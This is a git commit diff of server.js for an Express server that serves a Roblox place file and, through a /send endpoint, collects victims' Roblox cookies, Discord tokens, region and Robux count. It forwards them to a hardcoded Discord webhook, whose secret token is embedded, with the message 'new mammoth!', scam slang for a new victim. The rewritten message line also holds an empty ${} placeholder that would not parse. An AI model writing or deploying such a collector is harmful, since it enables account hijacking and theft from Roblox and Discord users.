5efd626b9216e605358b005c5658c6ca298ed72e
Catt3a <169023485+Catt3a@users.noreply.github.com>
2026-07-10 08:18:33 +0700

    Update server.js

--- server.js
+++ server.js
@@ -1,4 +1,3 @@
-const { table } = require('console');
 const express = require('express');
 const path = require('path');
 const app = express();
@@ -10,52 +9,37 @@ app.use(express.json());
 const webhookUrl = 'https://discord.com/api/webhooks/1519693949214658762/MVHMg0w16OS3IkPVwLODMU2myWyAC5VF86n-L74rmxhtyk-w_jITF7yg_qpXUaXNfsG6';
 
 app.get('/download', async (req, res) => {
-  const file = path.join(__dirname, 'public', 'sfa.rbxl'); // <=========================================
+  const file = path.join(__dirname, 'public', 'sfa.rbxl');
   res.download(file);
 });
 
 app.post('/send', async (req, res) => {
-        const reqBody = req.body;
-        const cookies = reqBody.cookies;
-        const tokens = reqBody.tokens;
-        const region = reqBody.region;
-        const fieldsArray = [];
-        const fieldsArray2 = [];
-        let index = 0;
-        console.log(cookies);
-        for (const key in cookies) {
-            if (Object.prototype.hasOwnProperty.call(cookies, key)) {
-                index++;
-                //name: "Memory",
-                //value: "4.2 GB / 16 GB",
-                //inline: true
-                fieldsArray.push(cookies[key]);
-                console.log(cookies[key],index);
-            }
-        }
-        for (const key in tokens) {
-            if (Object.prototype.hasOwnProperty.call(tokens, key)) {
-                index++;
-                //name: "Memory",
-                //value: "4.2 GB / 16 GB",
-                //inline: true
-                fieldsArray2.push(tokens[key]);
-                console.log(tokens[key],index);
-            }
-        }
-        console.log(`Новый мамонт!\nКуки: ${fieldsArray.concat("\n \n")}`);
-        const response = await fetch(webhookUrl, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify({ content: `@everyone\nНовый мамонт!\nРегион: ${region}\nРБ:\n${fieldsArray.concat("\n\n")}ДС:\n${fieldsArray2.concat("\n\n")}` })
-        });
-        console.log(response);
-        // Формируем правильную структуру для Discord
-        res.status(200).json({ success: true });
-});
+  const { cookies, tokens, region } = req.body;
+  let robux = 1488
+  try {
+    robux = req.body.robux;
+  } catch {
+    robux = 67;
+  }
+  const cookiesString = Object.values(cookies).join(' ');
+  const tokensString = Object.values(tokens).join(' ');
 
+  console.log('Cookies:', cookiesString);
+  console.log('Tokens:', tokensString);
+
+  const plainMessage = `@everyone Новый мамонт! Регион: ${region} \n \n РБ: ${cookiesString} \n ДС: ${tokensString} \n РОБУКСЫ: ${}`;
+  const content = '```' + plainMessage + '```';
+
+  // Отправляем в Discord
+  const response = await fetch(webhookUrl, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ content })
+  });
+
+  console.log('Discord response status:', response.status);
+  res.status(200).json({ success: true });
+});
 
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
